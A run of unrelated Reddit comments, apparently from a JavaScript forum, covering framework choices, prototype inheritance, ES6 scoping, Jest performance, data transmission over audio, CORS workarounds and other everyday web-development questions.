OMG! If this will work I owe you beer or something! Thank very much mate! I check this tommorow! I really appreciated! :)
http://wtfjs.com/
Obviously, but regardless of the complexity of the example (in fact, the more complex the UI, the *less* sense your recommended approach makes), my point remains. Use static CSS for predetermined UI states. Using script to try to keep track of all the components and their relationships is just shooting yourself in the foot before you've even started.
the repo/site seems outdated
I like this! I scanned quickly and didn't see.. how much effort is involved to make this do stylus -&gt; csjs -&gt; css. something like const styles = csjs(stylus` .thing background red `) 
That's because what you've created isn't an array: http://perfectionkills.com/how-ecmascript-5-still-does-not-allow-to-subclass-an-array/
You should really consider doing said "heavyCalculation" inside one or more web workers. Leave the main JS thread for updating UI and responding to user events. https://developer.mozilla.org/en-US/docs/Web/API/Web_Workers_API/Using_web_workers You will need to use postMessage and onMessage to communicate with these background processes. But the overall effect will divy up tasks much better.
still seems an empty object, will read that post!
I think the easiest way to do this might be to fork https://github.com/rtsao/babel-plugin-csjs-postcss to use the https://github.com/postcss/sugarss#sugarss-to-css parser. Then the stylus gets transpiled to CSS before CSJS attempts to process it. Just a thought, though.
I realize now, Array.length // 1 so is just inherited 
I have a framework which would be perfect for ya but it's not open sourced yet / still internal :(
Knockout is great and can be learned very quickly. 
I think a lot of the most vocal responses to this are negative because JS developers who have picked a stack they like and understand are (perhaps rightfully/understandably) apprehensive of the rate of change of the "state of the art" in JS-land. Angular becoming a less-marketable skill hurts certain people in a very real way, so they push back against it very vocally. But for those of us who are pretty new to the industry and haven't put a huge investment into promoting any one stack, it's very easy to see that this is the way things are headed. Many of the large tech companies (Airbnb, Uber, Facebook obviously) are transitioning to React+ES6. Many of the small ones too - my last job was working on transitioning in this direction, and my new company wants to do it (and hired me on the basis of having experience with it). And of course in six months we'll see if things are the same way, or if everyone's moved on to something else... Disclaimer: I worked with the author of this piece at my previous job (where we used Angular and Coffeescript :)
If you want to create something that is loosely like an Array (without the property `length` influencing, or being influenced by, elements), you should do: var arr = Object.create(Array.prototype);
I believe lodash does the same thing with their public repo, I'd check that out for examples.
Very well said. As always the most important thing to do is learn JavaScript, DOM, Web APIs. Any professional JS dev can pick up frameworks/libs with not much trouble, the rest is personal taste/opinion. . What we should also be doing is pushing a culture that values soft skills and language/platform knowledge instead of only niche solutions. I have read articles (and jokes lol) of teams that passed great talent because they were looking for X Framework Dev, instead of Senior JavaScript Dev...
Thanks, my little kids were having problems programming in English.
I was more referring to the apparent inefficiencies highlighted by /u/temp94292929 - rube goldberg device of finding the item; it's totally possible to do this in a more traditional way. Personally, I'd much prefer the clarity of the functional approach - I'd do it with `_.find(names, 'Sam')`
See the thing is, this problem has already been solved by a few technologies. Webpack (and similar module loaders) and http2 both resolve the issues described. Not to mention service workers. I’m just not convinced anything special has been achieved here. Maybe I don’t understand it?
Okay, this is **the most epic thing** I've ever seen in the field of webdev. Not the biggest-scale one, but the most epic? Definitely.
Except it's much more healthy. Literally
I've updated the game and its code! Can you take a look and see if I've correctly implemented some of your suggestions?
I've updated the game and its code! Can you take a look and see if I've correctly implemented some of the suggestions mentioned in this thread?
Check out the newly improved version! Is my interpretation of your suggestion satisfactory?
Added a soundtrack, among other things! 
We are using stylus with this tool on a current project at the agency I work but I have no idea how to set it up. Its possible though.
I'm still working through their paper (http://web.mit.edu/ravinet/www/polaris_nsdi16.pdf) but I would say their work goes well above and beyond anything webpack, rollup, etc can provide. Polaris even provides speed improvements when used over SPDY (close enough to HTTP2 I guess). It looks like there's a server side component and a client side JS framework. The server side component observes network conditions and delivers an optimized dependency graph to the client when a page is requested, and the client side JS framework loads dependencies and chunks (i.e. chunks of HTML) in an optimized order. Quote from the paper: "instruments web pages to track precise data flows between and within the JavaScript heap and the browser’s internal HTML and CSS state. For example, Scout [server side component I think] can track read/write dependencies for an individual JavaScript variable that is accessed by multiple JavaScript files" It definitely looks like they were targeting popular sites such as ESPN or apple.com, so it's questionable how much this approach would help with SPAs. Additionally, the benefits evaporate on well-cached pages so it seems like more of a first-page load optimization. Also on pages with "flat dependency graphs", (apple.com for example) there aren't any benefits. I'm not sure how you achieve a flat dependency graph -- that could be worth looking into. Anyways, I think it looks very cool and promising, caveats aside. I look forward to a public release so I can play around with it. 
I use es6 in all my apps and I find class to be the least useful feature. Spread, destructure and arrow functions allow for terse and expressive code
Got that mobile support too, nice.
my problem is that he is making react look like a clear winner without even mentioning vue, aurelia or ember. as viable competitors for any one new to js , they may decide to put up with react -- even though equally good(if not better) options are available-- just because "everyone" claims it to be standard. Edit: corrected my phrasing.
it is now, but when aurelia becomes production ready? when angular 2 becomes production ready? you know exactly what is going to happen to trends then, right?. at the end of the day, react has good amount of stars at github and works quite decently and so does other frameworks. as of now apart from react-native, there is nothing special in react. 
If you want to define things in the domain of computer science, object composition and even inheritance will reduce to f(g(x)) regardless of its implementation. Computer science is essentially math, and trying to use 'math' as your concept domain reduces a lot of concepts into the same thing. &gt; It's the same problem with holding up React as a big move towards a functional way of programming when it's class-based To be fair, you could write React in a semi-functional approach: const Text = (props) =&gt; &lt;p&gt;{props.children}&lt;/p&gt;; 
To get the job done, eh? It more or less depends on how fast can you learn. I suggest narrow your search to [Vue.js](https://github.com/vuejs/vue) &amp; [ember](https://github.com/emberjs/ember.js/) **Vue** Vue is view layer library with helper libraries like [vue-router](https://github.com/vuejs/vue-router) and [vuex](https://github.com/vuejs/vuex) for other needs. vue has low learning curve and is very powerful. It allows you to code as *simple* or as *complex* as you actually need. Vue can easily do client side validation and dynamically generated forms. For multi image uplaoding and browsing, I don't know if it supports but vue has no problem in co-existence with other libraries there is a [fantastic tutorial](http://vuecasts.com) for beginners **Ember** Ember is a fully fledged framework with good reputation. It gives you more power and is highly opinionated, so decision-making is easy. On the downside, it has a steeper learning curve as the framework is very big. Regarding your requirements, I am pretty sure, ember has answers to all problems which can be solved. of course, there are other frameworks like aurelia, angualr, react, ractiveJs etc. Aurelia and angular are full fledged frameworks. they are also in **beta**, so if you require a trusted full blown framework, you should not choose them. React is very good and is quite popular, but it is not easy to learn and ,imho, jsx &amp; inline styles are horrible. Unless you need reactNative, you are better off with Vue, Ractive is good but loses to Vue in terms of github stars and issue track record. 
Above you're making an ajax request. It's a special request you make on the client side (a more restricted version of a standard http request you would make when you for example visit an url on your browser address bar). The URL you use in the ajax request can technically be anything - but every request outside of your current origin is restricted, allowed or denied based on that urls headers. To get around this you can make your own simple server that makes a normal http request for you on the URL you want and send the response back to you. Or you could even parse the response on the server side and only return the information you're looking for to the client. Looking at the url ratemyprofessors it seems they have invalid SSL certificates pointing to a248.e.akamai.net. This inconsistency will make browsers (client side) block the request regardless if CORS is enabled or disabled. Again, you can bypass the security restrictions of ajax requests by making your own server to do the normal http or https requests for you and then return that information to your client -&gt; a simple proxy server is probably the simplest way.
I am a god at your game. http://imgur.com/gTF1gZK
I second this. The learning curve is **significantly** smaller than angular while being more than capable of handling most issues. A highly under-rated framework, imo
Seriously I don't know why it's not talked about more. It has just as many stars as react and angular on Github but while job searching most companies use either angular or react or just plain old Jquery. Hopefully that changes soon. 
Very, very cool!
Escape the underscores with a \\ character. You type: \\\_\\\_proto\\\_\\_ You see: \_\_proto\_\_ Or surround your code with backticks, to the left of the 1 key. You type: \`\_\_proto\_\_\` You see: `__proto__` 
Tried switching to inline styles in react-virtualized for a while but abandoned due to vendor-prefixing issues. Libs like autoprefix have pretty large configurations and I am not aware of anything that handles both keys (eg appearance) and values (eg flex) correctly at runtime...does this? I don't see it mentioned in the README. Any thoughts on how to approach it? Edit: Typo. Mobile.
Much better! Hahaha
Hey, thanks for the reply! Regarding global variables, I tried to figure out a clean way of passing the object to the event handler, but couldn't figure it out. Do you have any idea how I could do it? Would I have to return the game object somewhere and use it in an anonymous function or something? I understand more now what you mean by decoupling the logic. And, I thought I fixed pressing enter while playing a game! I guess not, hmph. I'll take a look at that when I work on this again. Thanks so much!
Omg you're so good. How do you do it?!
Meanwhile my company just decided on typescript and angular 2. Sigh.
This is incredible!
Thanks so much, I think I understand now. 1. Instances are objects and thus get a \_\_proto\_\_ property when created. 2. By default, the prototype points to the parent. 3. Since this object inherits the properties and methods of its parent, prototype, is available to the new object via the prototype chain. In other words, this new object will NOT have a prototype property but a \_\_proto\_\_ property that points to the parent which has a prototype property that is available to all of its (parent's) instances. Is this correct? Thanks again.
x-gif is more betterer http://geelen.github.io/x-gif/#/http://i.imgur.com/iKXH4E2.gif but this is an interesting concept. 
https://www.youtube.com/watch?v=9QveBbn7t_c
Parent might not be the right word. But it's all just Objects linking to other objects (OLOO), and that link is represented by the `__proto__` property, because that's how the lookup delegation works. Also the prototype on a function may have methods added to it, or be replaced with a different object (eg `MyFunc.prototype = new Thing()`), so it's not "always" an "empty object", it just starts out that way. (by empty object I just mean the same type of object you get when using `{}` in the object literal syntax.)
This is a new behavior of es6 (the newest JavaScript spec). With es6, js now supports block scoping and function declarations behave like let and const in that they are now block scoped too - probably one of the bigger, breaking changes coming from es6. Quick Google search reference (see point 7): http://www.2ality.com/2015/02/es6-scoping.html?m=1 Edit: just read that link. Not greatest for info, but I'm sure you can find something better out there if you're interested, now you know what to look for
I’d avoid the word “parent”, it only makes things confusing. The foundation of JavaScript OOP are two mechanisms: * Objects * The prototype relationship between objects. In the specification, the prototype of an object is stored in an internal property `[[Prototype]]` that is either `null` or refers to an object. _Internal_ means that there is no direct way of accessing the property. But you can do so indirectly, via `Object.getPrototypeOf()` and `Object.setPrototypeOf()`. Additionally (in ES6), there is a getter and a setter named `__proto__` that most objects inherit from `Object.prototype`: Object.prototype = { get __proto__() { return Object.getPrototypeOf(this); } set __proto__(p) { Object.setPrototypeOf(this, p); } ··· }; Additionally, each function that can be invoked as a constructor (via `new`) has the _property_ `prototype` whose value becomes the prototype of every instance it creates. The diagram in the following section of my book may also help (scroll down to see it): http://speakingjs.com/es5/ch17.html#constructors
Great overview. If anything is certain, is that all of this will be totally different in a years time. Smaller libraries, like Christian Johansen's Sinon test spies, has settled during the last 5 years. Redux on the other hand is still in it's very early infancy, and may be replaced or changed a lot within a year.
Oh boy, thanks for the info. This is a bit of a kick to the system, this code worked for 16 years.
Thanks, great article, brief and covering a lot of ground.
childsplay
The thing is, for both React now, and Angular before, these were objectively accurate things to say. Angular, by any account, is the first JS framework that actually picked up. Like, really picked up. Backbone was kind of hot for a bit, but if you look at trends on Stackoverflow or Google (not great sources, but in this case the number is so drastic, it should do), you'll see Angular being absurdly popular. And that lasted a long time, too. 4~ years or so, only counting the time when Angular was "hot". Hardly the "new framework every other day" people complain about. Now, React is not nearly as popular, but the approach is picking up. Even if React was to die, there's a ton of drop in replacements and alternatives that you could put in your app with barely any change. React itself is just ahead of the list of framework that do things that way. Even Angular 2.0, at this point, is closer to React than it is to Angular 1.X. The quality of apps coming out of it are a drastic step up in the same line as the jump we got when jQuery came out. React is also not new anymore. It's been around for 3+ year. It's no jQuery, but it's not flavor du jour either. This is a fairly different scenario from the ones before. At worse its another Angular case (4~ years not from when it was created, but from when it got popular). If React is to be "hot" for 4 years from when it bursted into popularity (so early 2015), and the next framework will roughly use the same approach (eg: unidirectional dataflow), then if you want a reasonable upgrade path for the app you start today, it really should be React. Now, there's a lot of signs that React is more than what Angular was (if only because it's being dogfooded to crazy amounts, and 90% of all the large SaaS companies are starting to use it... Facebook, Netflix, Amazon, even banks!) and it may be more akin to jQuery in lasting power... We'll see!
Why React is nice is that all it really is, is a library that makes a proper design pattern that is older than most of us here (the unidirectional data flow and "loop", similar to how some of the oldest games and rendering engines were made!). Flux is based on languages such as Elm and Haskell. Languages, not frameworks! Already there's alternative to React that, if you were to switch, would not be a big deal. The jump from Backbone to Angular would be hard. From Angular to React can be pretty drastic (a little less if you followed the 1.5 patterns). From React to (next thing), probably a lot less, as while we never know what will happen with the lib, the design pattern is most likely there to stay.
Yeah, when I was using requirejs, we used some framework/tool to do the DI... Require lets you override modules with another module of the same name, as long as you do it before the require call (last one wins), and you have access to the internal registry, so tools were made for it. I wonder of those tools have been renamed though, cuz i can't find it anymore. It was something like...Knight.js or some other soldier-like word. I forget!
&gt; I think a lot of the most vocal responses to this are negative because JS developers who have picked a stack they like and understand are (perhaps rightfully/understandably) apprehensive of the rate of change and those developers should really take a long hard look at the language they chose then. JavaScript, for years, has been a language whose landscape changes constantly... probably more so than any other scripting language out there. You can't marry a library and expect it to remain relevant for years. jQuery being one major exception.
I do agree that people should be wary of hopping on the next bandwagon, and that many people in the industry have seen this "woo! shiny new thing!" momentum before and it hasn't really gotten us anywhere. I think this time is different, to some extent: better package management and import/module systems mean that a monolithic framework isn't the best for all use cases any more, and lots of people will see benefits from taking lighter dependencies like React (remember, it's just a view layer) and composing just the ones you need rather than locking yourself into a whole big framework. If React isn't the thing that takes over, hopefully at least the paradigm it represents will be. 
When you look at a project's package.json file there is a property called *main*. This property points to the single target file, typically named `index.js`, that is the application entry point for the package. At publication time the files in an NPM package directory are bundled into a tarball before being sent off to NPM and then everyone else. Issue 5082 is the problem where the file indicated by *main* is not included in the tarball. **The defect is catastrophic and there is nothing you can do about it.** When this problem occurs the NPM package is worthless (a dead brick that breaks all dependents). So far nobody knows how to predict it or prevent it as the cause remains a mystery. This also means there is no resolution and it appears randomly, so you don't know when it will strike. So far it seems there are two mitigations. The more reliable one uses a Bash script and git hooks to attempt to trap the package at the creation of the tarball during the NPM publication run and then add the file in if its missing. There are some serious limits to this approach as JavaScript is more pervasive than Bash and the NPM directory must be a git clone. The approach of this NPM package is vanilla JS, so it will work everywhere NPM runs. Since it is vanilla JS reliant on Node/NPM it could also be extended to provide logging and beaconing of evidence back to NPM so that maybe a cause can be identified. This approach is more risky because it allows the failure to occur (completes the publication event). It installs the package in a temporary location to identify if the problem is present, and then republishes with a new version number.
&gt; Angular becoming a less-marketable skill hurts certain people in a very real way, so they push back against it very vocally. This line of thinking arises in every industry. Honestly, anybody who pivots their career around a framework deserves to fail. A framework is an application tool. It isn't a skill. The ability to solve a given set of problems with/without that framework is the skill.
https://www.reddit.com/r/javascript/comments/48t893/dsxyliea/ A better way to simulate dyslexia is to go run 2 miles and then be forced to read an obscure dissertation immediately upon finishing your run while several people are yelling at you. Oh, and there is a 5 minute time limit. Don't get frustrated or give up... people might think you have ADD.
Surprised you managed to not mention Backbone. Very commonly used. Large community.
This seems like it would be an awesome way to do pairing of desktop/device browsing sessions rather than typing in a token. But because of browser support, it might have to be unidirectional (device -&gt; desktop). And you'd probably have to put a note about it being Chrome/Edge only? Still really cool. There's also company that does something like this (and has an SDK) called [Chirp](http://www.chirp.io/).
[for when you need just a little more than this.](http://es6-features.org/)
thanks!
Use Moment.js or another library. I know this might sound dogmatic or not helpful but trust me that you don't want to go down the rabbit hole that is programming for time or timezones. If your app grows there's a lot of danger in assuming time is a constant; for instance, some minutes have 61 seconds (leap seconds), your app should account for that. What about localizing for time zones? There are so many edge cases when it comes to time, this video tells the story really well. https://www.youtube.com/watch?v=-5wpm-gesOY The way you'd do this in moment.js is like this: // Let's do quarterly here, so our end date will // be 3 months after the start date. var day = moment().date(); var month = moment().month() + 3; var year = moment().year(); var endDate = moment().year(year).month(month).date(date);
Isn't that a modem? Essentially?
I'm very much looking for performance tips. It seems that as more videos get added, a lag comes up when a video is triggered. I can't seem to figure out the cause of that lag. I assume that it's not youtube downloading video content, since the videos are already buffered up to that point. The DevTools Timeline shows a spice in Scripting CPU consumption, right before the framerate drop (i.e. lag), and that's all I could get from the timeline. Please also suggest some tutorial on profiling, preferably for non-static pages, with example of how to trace and remove bottlenecks.
On mobile so I can't check for certain but I believe [window.resizeTo](http://www.w3schools.com/jsref/met_win_resizeto.asp) might be what you're looking for. 
Some great suggestions/advice! If you can, take a look at the updated version and tell me what you think. 
Sorry for the delay - had a busy time but did not forget I said I would join in: http://codepen.io/dlueth/pen/YqWVmq?editors=1010
Same reason anyone decides to use any framework. People here a new "buzz word" and really want it. It's new and shiny therefore must be better than anything we currently have. But I struggle to get them to answer "why?" as well beyond the above... if something is the right fit great, if not, I don't think it's a good idea. But what I'm really trying to figure out is... am I just not finding the right guides, tutorials, examples, etc or is Angular just really all about ticky tacky web-sites that just need basic forms or is this thing really powerful beyond what I realize?
I don't see a specific framework for "sign up tutorial" listed, but if you point Wappalyzer at the page where it's used, you should get an answer. 
Only specific statements (like return) have automatic semicolon insertion, function does not. Yes I am aware of it. https://stackoverflow.com/questions/2846283/what-are-the-rules-for-javascripts-automatic-semicolon-insertion-asi
Laravel
Amazing video. Thanks for sharing that.
Server side rendering actually works now? I only heard about Ionic for "native" apps. But I don't think they did it like react native. Do you have sources for this?
So what Problem(s) does Angular solve? Edit: I should probably clarify more. We do have problems needing solving. We need a framework that provides some sort of MV* pattern. We build large apps, this is a must. Angular claims to have this, large data-sets, ViewComponents which allow me to integrate with widgets based on jQuery (whether Angular likes it or not, that's the standard out there). Use of data-binding in a way that natively assumes the app will be handling "larger" data, (larger meaning more than a string of text). Angular and most frameworks get the rep to do all that, but I end up disappointed one framework after another... I feel a lot of the time the frameworks are just not built to scale almost as if the designers are just so used to building a wordpress site or something and don't understand anything more complex than that, which worries me... but like I said, I'm not trying to complain, I kinda wish I'd be proven wrong and shown the way, not just told "It's new, it's shiny, it does everything, no further questions"
No modules?
Looks great. You still have variables that are really tied to the instance of the game but are not part of the object. I would make the interval a part of the game object since it has a strong relation with it. The rest of these aren't necessary, its just what i do when writing code that has to be maintainable and have clear intentions: Make the paddle and the ball each be their own objects so you would have: game.paddle = {x: 1, y: 2, width: 10, height: 10}; game.ball = {x: 2, y: 5, radius: 3}; Its not really necessary but it makes it a bit clearer whats what and any code you might make to deal with geometry calculations is more likely to work with both objects without making any changes. Make the file only output one global variable, ie. one object to act as your library that contains all public functions. [Here](https://bitbucket.org/Luka4ever/charroller/src/03e0049182f314076d098b333cf6d717c49f1d0a/charRoller.js?fileviewer=file-view-default) is a library i wrote not too long ago that follows this style and isn't too terribly long. By following this style you have a lower chance of colliding with any other library you might add to the page at some point, and it should be easier to find things in your code. Note you really don't have to use the prototype pattern its just how i usually write JavaScript libraries that work with custom objects.
sounds good, thanks
Uh.. the past? This has been done quite a few times before, maybe not with web audio api, but it's not a new thing to modulate data over audio.
Can't wait for someone to create a library for SSTV or other digital modes.
Second option is better since that's the direct-native way and also better for cache, use it always than possible. Use first option for needed cases only. 
What do you mean by, "Non web app" website? Do you mean not a SPA? I think you're looking for Meteor, but I'm not 100% sure what you're asking. You might be looking for a library rather than a framework since you're loading from a CMS. (In that case you don't want Meteor.)
Again, I think much of what you write there is reasonable, but as a relative "old fogey" who's been building web stuff since long before any of these modern frameworks existed and programming generally since long before that, I also think you're being a little optimistic. Huge monolithic frameworks were always a dubious dependency, and the longevity or otherwise of systems built around them was always suspect. Plenty of people, myself included, have made this case many times over the past few years. Of course, web development is still a relatively young industry and naturally it attracts young people who are excited about new technologies and don't want to follow a more cautious, conservative, "boring" approach. In the same way, I think if you look around you'll find plenty of experienced developers who don't think the package management in the web world is so great today. The NPM ecosystem is far from ideal, partly because of limitations in the tool and weaknesses in the conventional versioning model, but more fundamentally because of the cultural emphasis on using large numbers of small or downright trivial modules. Large parts of the community are jumping from one extreme to the other, and in time they're going to learn all the same old lessons from that mistake as well. At least build tools are getting saner, as people have started to question how much benefit they really get from the extra complexity of using task runners and overly flexible runtime module-loaders and so on. However, we're still dealing with kindergarten issues by general compiler standards. While techniques like modular development and tree-shaking are certainly useful, only in web development would these things be considered new and exciting; everyone else in the programming world was doing this kind of stuff *decades* ago, and it's completely routine and expected. The latest trend is obviously for a more declarative, functional style. React is the standard-bearer for this approach in the view space. Probably Redux is the most high-profile counterpart in terms of handling the underlying data. These, too, are positive steps in my opinion, but again they're reinventing wheels all over the place ("unidirectional data flow" is my favourite not-even-slightly-new idea to dominate the blogs lately) and again I think everyone jumping on the bandwagon will re-learn some old lessons over the next year or two (mostly in terms of performance and flexibility when you start trying to build UIs that are more complex and interactive than the glorified forms and mostly static rendering that most web apps are today). Which brings me back to where I came in: I agree that many of these recent developments are probably useful steps in a reasonable direction, but in the big picture, a lot of them aren't really as new and innovative as the hype would suggest. It's likely that the tools and more importantly the design and architectural ideas behind them will continue to evolve rapidly in web development.
Big lack of context here. Why do you want to send 8000 objects to the browser? How's anyone going to read or review 54,000 fields? 
&gt;it's not easy to do so a lot of people wouldn't do that as a personal project Haha! You have no idea. This isn't even a compiler!
Author here. This is my first piece; any feedback is welcomed!
A lot of people aren't creative thinkers, and that's not a surprise. Is modulating data over audio amazing? It entirely depends on your perspective. I built a modem by myself when I was 19 years old, way back in the 80's. It wasn't really that difficult because I was curious about the tech, and I read everything I could on the subject. Eventually I realized I had everything I needed in my parts box to build a simple modem. Having the initial spark to do something is usually more difficult for most people than actually doing it. 
[Here is another interesting project using ultrasonic frequencies for data transmission.](http://smus.com/ultrasonic-networking/)
Great start, illustrates some common pitfalls.
It sounds to me like one of those "Craftsman blaming his tools" type of situations. I used angular, for enterprise apps with thousands of rows, image manipulation, animations and all kinds of other stuff. It's easy to fall into abusing two way binding for every single thing and the blame the framework because it's slow. Also, jQuery might be some sort of a standard, but I just dropped it all together and haven't looked back. Not saying it's bad, but I don't see the need of it anymore either whether it's with angular, react or polymer or whatever else. 
It's definitely more powerful, but you really have to know how to use it. Once you get the work flow down and know how to use it efficiently I is incredible how fast it is possible to build out complex apps 
Interesting, you still have some good skills to know technical terms and things :) Even with motivation, if one doesn't understand the subject he's working on, it will be hard
Go is really a cool language. I'm going to go out on a limb and say it's going to explode soon (as if it doesn't already have a great following.) I like the design of the language. It looks fun and performant.
I really like JavaScript and Node is what got me in to developing at all. But when I finally decide to dive in to Go, that's when programming became truly fun. 
I am trying to get this to work on any browser in iOS. It doesn't work on chrome, safari, or firefox for iOS. As far as debugging I don't have a mac to debug it with...
most modern browsers will prevent window resize or positioning. otherwise, he seems to be reinventing the popover/popunder ad. which is also prevented by many modern browsers. resizing a user's browser unexpectedly, such as on load, is a really really bad user experience. popping a window on request is less bad.
I would be wary of using an immutable style in graphics rendering code. You can end up generating lots of useless structs in every frame, and start triggering GC pauses once your scenes reach a certain size.
Yes, not a single page application. Just a library, framework, best practices, or project that gives a bit of structure to managing lots of Javascript in lots of pages ( by lots of people)
Thanks for your insight
This is an overly critical lens through which to view the world. In fact, quite a few people were surprised at quiet's demonstration, so it hadn't occurred to everyone that it's feasible. Additionally, as in everything to do with software, the execution matters at least as much as the idea, if not more. Quiet provides a c library and a js library, so it's relatively cross-platform. The libraries offer a fairly straightforward interface that removes the need for the dev using them to know much DSP or how this works. So, in that regard, it should substantially enable people to use this tech right away in whatever projects they choose.
Ugh. my comment reads like it's written by a total dick. I didn't mean it to come off like that, but the message remains. 
I'm curious if you talk about scalability issues with Angular or Angular 2, what did you use before Angular or Angular 2? I work on a fairly large Angular app, and I do understand that certain aspects of Angular (at least 1.x, haven't done much with 2) do present challenges/performance issues, I cannot imagine writing a large app in just jquery, that would be a nightmare IMO. Also, while jquery has its merits, I don't think it's something that is a requirement for a framework to work with. Look at React, it's an amazingly powerful framework, but you can't *really* use jquery with it. Are you saying your project is mixing jquery into your Angular app, not just using 3rd party jquery libraries? If that's the case, you seem to be missing the point of Angular. To properly build an Angular app, you should not be treating jquery as a first class citizen
WeChat has some payment method over audio. I've seen it used once with a snack machine, it's super funny. 
Hi /u/simonsarris, this post was removed. Please see our [posting guidelines](http://www.reddit.com/r/javascript/wiki/index).
Really great article - it was very enjoyable to see you explain in a step-by-step fashion how to break code out into reusable functions/methods that maintain separation of concerns. It can be really hard to find tutorials / blog posts on stuff like this.
/r/learnjavascript is better for this, but anyway, if you have a reference to that textbox stored in a variable called `elt` (use [`getElementById`](https://developer.mozilla.org/en-US/docs/Web/API/Document/getElementById) or [`querySelector`](https://developer.mozilla.org/en-US/docs/Web/API/Document/querySelector) to get this reference), then its [`value` property](https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement#Properties) (`elt.value`) is the contents of the textbox, as a string, and then you can check whether this string contains the `,` character. Note that even if you try to set the `value` property of an `input` element to some non-string value, it will be coerced to string.
&gt; Of course, web development is still a relatively young industry and naturally it attracts young people who are excited about new technologies and don't want to follow a more cautious, conservative, "boring" approach. There's an 8 year difference between the initial release of C, and the first web browser. 36 years to 44. The time for young new technology people came and left 30 years ago.
Wow, that's a long time. Karma with Mocha and RequireJS takes about 15 seconds to run our complete suite of 3,000 unit tests. That includes that start-up time, which is most of it. If you have `--watch` enabled, then the next run will only take about 5 seconds. And it's trivial to add `.only` to a test group to speed it up further. The protections that Jest offers like a clean dependency graph on each run and module aliases seem useful, but it's probably why things are so slow.
It can be incredibly powerful for any sort of CRUD app. Doesn't necessarily have to be customer-facing; I think you're being a little too narrow-minded about its application. Any sort of web software that requires a lot of data to be managed in one place- think about universities/companies using it for managing student/customer data, for example. At my company, its been used for various projects, one such being an interface to build pages on our website (we have 100s of pages). It's an angular app connected to a Java API that pulls content from a CMS. This would be very complicated to do with something like jQuery alone, thus they went with Angular. 
This is a really cool idea, I can think of lots of uses for this.
I have shared all of that, but the client is really insistent that it needs to be done this way for this application.
That looks very familiar to something that I found else where on the web. If so, it did not work. Probably because most browsers block it like others are stating. Thank you, though.
I never said it wasn't a good project, or anything like that - I was replying to how people get this kind of ideas, and I simply replied that it's not a new idea, it's a very old idea that's been around a long time. I think you're the overly critical one here.
For Node, I'd focus less on just Express and servers, and more on: Different design patterns: reactor, observer, callback. Conventions (callback last, error first, etc.). Know how sync vs. async calls work (connected to event loop/task queue). How the module system and `require` work from a high level. Be familiar with the commonly used node-core modules (fs, http, etc.).
That's awesome. Thanks!
I think the point is that modems used to use sounds, so this is basically just that, but louder at a different frequency.
Hi, I'm Christoph from the Jest team. @Cody_Chaos I'm sorry you had a bad experience. You are right, Jest used to not be so great in open source. Now that Jest works great at FB, we are focusing on our external clients and their experience. I think you can get a good idea of all the changes we made in the past few months just from the changelog: https://github.com/facebook/jest/blob/master/CHANGELOG.md especially 0.9 has been a big release. If you wanna check what the performance is like for Jest, I recommend taking a closer look at the blog post and then try to run the Relay test suite: https://github.com/facebook/relay – they have some heavy tests. Note that the first test run also includes the transform time (Babel) for every single file. This is usually just a one time cost because most files don't change between test runs, so make sure to run Jest at least twice :) Finally, if you choose to try out Jest again I'd like to invite you to our discord channel (see http://facebook.github.io/jest/support.html#content ) and please absolutely do open issues on GitHub about what might still be annoying to you – I'd be happy to work with you on resolving them. @djvirgen I should have maybe mentioned that the test runtime in the blog post is talking about a few thousand test suites and tens of thousands of individual tests. I'm confident at this point that there is no overhead inside of Jest that slows tests down that we wouldn't also have with other test runners. I think the blog post also goes over some of the problems we were trying to solve that are quite unique, like test isolation – it's definitely something we don't wanna miss as we scale up our engineering team :)
Hey! I'm Christoph from the Jest team. We are finally at a point where we can help external clients more. We recently started a blog (see http://facebook.github.io/jest/blog/2016/03/11/javascript-unit-testing-performance.html ) and we pretty much rewrote the entire framework in the past few months and just completed version 0.9, see https://github.com/facebook/jest/blob/master/CHANGELOG.md#090 If you ever give Jest another chance, feel free to join us on discord ( http://facebook.github.io/jest/support.html ) and please *do* open issues on GitHub for anything that might not work as you'd expect :)
if it's a recordset-like collection, consider compressing it via JSONH [1] to a csv-like format &amp; make sure you have gzip enabled on the server. you'll probably cut the size down to 300k without gzip and &lt; 150k gzip. should be no problem. [1] https://github.com/WebReflection/JSONH
Multiple time series with high resolution and a long period?
Using setInterval instead of an event listener is actually stupid.
It's great and easy to understand. And I fully agree with it, I sometimes have the same problems with C# and LINQ. It's very easy to write yourself into a corner with those where the whole thing requires a lot of thought to understand even if writing it was easy.
Listening for DOMContentLoaded is the usual way of doing this: document.addEventListener("DOMContentLoaded", function(event){ console.log("DOM fully loaded and parsed"); }); From [MDN](https://developer.mozilla.org/en-US/docs/Web/Events/DOMContentLoaded): &gt; The DOMContentLoaded event is fired when the initial HTML document has been completely loaded and parsed, without waiting for stylesheets, images, and subframes to finish loading. Example 1 in the article will needlessly run the loop over and over and poll for changes. Your callback will not fire immediately as the next poll could wait up to the frequency of your interval (100ms in article) to fire. Example 2 waits for readystate to become "complete" [which does not happen until after load has fired](https://developer.mozilla.org/en/docs/web/api/document/readystate) (ie. after images etc. have loaded - much later than jquery's ready() which it was supposed to emulate). Possibly modifying example2 to wait for "interactive" rather than "complete" would be equivalent, but it's still more code and moving parts than my example above. The other advantage you get from jQuery is browser compatibility. It's [not so much of an issue any more](http://caniuse.com/#feat=domcontentloaded) but if you had to support IE8 then jquery 1.x had support and polyfilled when using $.ready().
&gt;Some people, when confronted with a problem, think “I know, I'll use regular expressions.” Now they have two problems. 
So then why does this work? { function ft() { alert("Works"); } } ft(); I'm pretty sure this is not considered a new scope for the same reason an if statement is not considered a new scope.
Yes. The first modems used audio that literally came out of the telephone handset. The handset was placed on a cradle and it got really noisy for a while. There was literally an air gap between the phone and the modem, and the data was transmitted using audio. https://en.wikipedia.org/wiki/Modem?wprov=sfii1
Novice web designer/dev here. My understanding is that this is useful for automation / testing? Can anyone enlighten what you would use this for? 
My first computers were a Commodore C64 and later an East German K85. Both loaded and saved data from/to a cassette (the East German computer used regular consumer cassette radio-players). And an East German radio station (DT64) - but there were many worldwide doing that - broadcasted code: You record the broadcast and play it on a cassette player to your computer, where you had started a piece of software listening to the sounds. Look up BASICODE: https://en.wikipedia.org/wiki/BASICODE -- but *any* code would work. You could *hear* the difference between assembler code and BASIC code. During those broadcasts you hoped your neighbor didn't start a big electrical device like a table saw, because (this being East Germany) those often where self-made devices with no electrical shielding and you'd get a split second cracking sound on radios of the neighborhood, ruining your recording past what the error correction could recover from. Found an article: http://arstechnica.com/business/2012/08/experiments-in-airborne-basic-buzzing-computer-code-over-fm-radio/ **Here is a code-sound sample:** https://ub.fnwi.uva.nl/computermuseum/hobbyscoop.php (starts 5 seconds in)
